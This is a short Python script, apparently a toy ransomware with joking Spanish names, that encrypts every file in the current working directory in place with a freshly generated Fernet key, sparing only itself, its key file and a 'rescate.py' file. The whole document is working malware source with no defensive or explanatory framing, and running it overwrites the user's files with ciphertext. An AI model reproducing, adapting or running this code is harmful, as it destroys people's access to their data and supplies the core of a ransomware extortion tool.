#!/usr/bin/python3

import os
from cryptography.fernet import Fernet

# Eto se va descontrolaaaaaaaaaaaaa

NOMBRE_LLAVE = "regalico.txt"
NOMBRE_FICHERO = "ramsomware.py"
NOMBRE_RESCATE = "rescate.py"


def encrypt_files(fichericos, key):
	for ficherico in fichericos:
		with open(ficherico, "rb") as abierto:
			content = abierto.read()
		with open (ficherico, "wb") as abierto:
			content_encrypted = Fernet(key).encrypt(content)
			abierto.write(content_encrypted)

def generar_key(keyjej):
	with open(NOMBRE_LLAVE, "wb") as llavecica:
		llavecica.write(keyjej)


def fuiste_troliado():

	files = []
	for file in os.listdir():
		if file == "ramsomware.py" or file == "regalico.txt" or file == "rescate.py":
			continue
		files.append(file)


	key = Fernet.generate_key()
	print(files)
	print(key)
	generar_key(key)
	encrypt_files(files, key)

	


if __name__ == "__main__":
	fuiste_troliado()
